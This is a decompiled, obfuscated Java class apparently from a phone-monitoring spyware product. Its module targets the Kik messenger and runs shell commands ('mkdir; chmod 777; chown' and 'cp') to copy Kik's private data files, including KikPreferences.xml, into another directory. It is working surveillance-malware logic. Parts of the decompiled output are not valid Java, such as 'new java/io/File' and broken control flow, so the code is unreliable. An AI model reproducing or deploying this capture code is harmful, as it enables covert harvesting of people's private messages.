package com.vvt.capture.kik.b;

import com.vvt.capture.kik.b;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a()
  {
    return com.vvt.n.a.c.a.b();
  }
  
  public static String a(String paramString)
  {
    return p.a(paramString, "kik");
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    String str1 = a(paramString1);
    String str2 = p.a(str1, "KikPreferences.xml");
    try
    {
      boolean bool1 = ShellUtil.b(str1);
      if (!bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        j = 5;
        arrayOfObject = new Object[j];
        int k = 0;
        str3 = null;
        arrayOfObject[0] = str1;
        k = 1;
        arrayOfObject[k] = str1;
        k = 2;
        arrayOfObject[k] = paramString3;
        k = 3;
        arrayOfObject[k] = paramString3;
        k = 4;
        arrayOfObject[k] = str1;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(str1);
        }
      }
      str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int i = 7;
      Object localObject = new Object[i];
      int j = 0;
      Object[] arrayOfObject = null;
      String str3 = b.a(paramString1);
      localObject[0] = str3;
      j = 1;
      localObject[j] = paramString2;
      j = 2;
      localObject[j] = str2;
      j = 3;
      localObject[j] = str2;
      j = 4;
      localObject[j] = paramString3;
      j = 5;
      localObject[j] = paramString3;
      j = 6;
      localObject[j] = str2;
      str1 = String.format(str1, (Object[])localObject);
      KMShell.a(str1);
      bool2 = com.vvt.aa.a.c();
      if (bool2) {
        ShellUtil.k(str2);
      }
      bool2 = a;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return str2;
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject = new java/io/File;
        ((File)localObject).<init>(paramString1);
        localObject = ((File)localObject).getName();
        str1 = p.a(paramString2, (String)localObject);
        localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        int i = 5;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString2;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString4;
        j = 3;
        arrayOfObject[j] = paramString4;
        j = 4;
        arrayOfObject[j] = paramString2;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(paramString2);
        }
        localObject = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        i = 7;
        arrayOfObject = new Object[i];
        j = 0;
        String str2 = b.a(paramString3);
        arrayOfObject[0] = str2;
        j = 1;
        arrayOfObject[j] = paramString1;
        j = 2;
        arrayOfObject[j] = str1;
        j = 3;
        arrayOfObject[j] = str1;
        j = 4;
        arrayOfObject[j] = paramString4;
        j = 5;
        arrayOfObject[j] = paramString4;
        j = 6;
        arrayOfObject[j] = str1;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str1);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str1;
      bool = a;
      if (!bool) {}
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    String str1 = p.a(paramString2, paramString3);
    try
    {
      bool = ShellUtil.b(paramString2);
      if (!bool)
      {
        str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        i = 5;
        arrayOfObject = new Object[i];
        j = 0;
        arrayOfObject[0] = paramString2;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString5;
        j = 3;
        arrayOfObject[j] = paramString5;
        j = 4;
        arrayOfObject[j] = paramString2;
        str2 = String.format(str2, arrayOfObject);
        KMShell.a(str2);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(paramString2);
        }
      }
      String str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int i = 7;
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      String str3 = b.a(paramString4);
      arrayOfObject[0] = str3;
      j = 1;
      arrayOfObject[j] = paramString1;
      j = 2;
      arrayOfObject[j] = str1;
      j = 3;
      arrayOfObject[j] = str1;
      j = 4;
      arrayOfObject[j] = paramString5;
      j = 5;
      arrayOfObject[j] = paramString5;
      j = 6;
      arrayOfObject[j] = str1;
      str2 = String.format(str2, arrayOfObject);
      KMShell.a(str2);
      bool = com.vvt.aa.a.c();
      if (bool) {
        ShellUtil.k(str1);
      }
      bool = a;
      if (!bool) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
    return str1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */